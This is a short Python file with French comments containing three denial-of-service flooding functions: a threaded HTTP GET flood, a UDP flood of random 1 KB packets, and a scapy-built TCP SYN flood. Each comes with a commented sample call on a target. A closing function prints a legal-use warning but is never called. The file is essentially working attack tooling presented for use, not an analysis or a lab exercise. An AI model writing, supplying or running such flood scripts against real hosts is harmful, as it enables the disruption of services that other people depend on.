import requests
import threading

def send_http_requests(url: str, num_requests: int, timeout: int = 5):
    """
    Envoie un grand nombre de requêtes HTTP GET vers une URL spécifiée.

    :param url: URL de la cible.
    :param num_requests: Nombre total de requêtes à envoyer.
    :param timeout: Temps d'attente avant expiration d'une requête.
    """
    def send_request():
        try:
            response = requests.get(url, timeout=timeout)
            print(f"Requête envoyée à {url} - Code HTTP : {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de l'envoi de la requête : {e}")

    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Exemple d'utilisation
# send_http_requests("http://example.com", 100)
import socket
import random

def send_udp_packets(target_ip: str, target_port: int, num_packets: int):
    """
    Envoie un grand nombre de paquets UDP vers une cible.

    :param target_ip: Adresse IP de la cible.
    :param target_port: Port cible.
    :param num_packets: Nombre total de paquets à envoyer.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)  # Charge utile aléatoire de 1 KB

    for _ in range(num_packets):
        try:
            sock.sendto(payload, (target_ip, target_port))
            print(f"Paquet UDP envoyé à {target_ip}:{target_port}")
        except Exception as e:
            print(f"Erreur lors de l'envoi du paquet UDP : {e}")
    sock.close()

# Exemple d'utilisation
# send_udp_packets("192.168.1.1", 80, 1000)
from scapy.all import IP, TCP, send

def send_tcp_syn_packets(target_ip: str, target_port: int, num_packets: int):
    """
    Envoie un grand nombre de paquets TCP SYN vers une cible.

    :param target_ip: Adresse IP de la cible.
    :param target_port: Port cible.
    :param num_packets: Nombre total de paquets à envoyer.
    """
    for _ in range(num_packets):
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(dport=target_port, flags='S')  # Flags SYN
        packet = ip_layer / tcp_layer

        try:
            send(packet, verbose=False)
            print(f"Paquet TCP SYN envoyé à {target_ip}:{target_port}")
        except Exception as e:
            print(f"Erreur lors de l'envoi du paquet TCP SYN : {e}")

# Exemple d'utilisation
# send_tcp_syn_packets("192.168.1.1", 80, 500)
def warn_authorized_use():
    print("AVERTISSEMENT : Ces outils doivent uniquement être utilisés à des fins légales et éthiques. "
          "Assurez-vous d'avoir l'autorisation du propriétaire de la cible.")
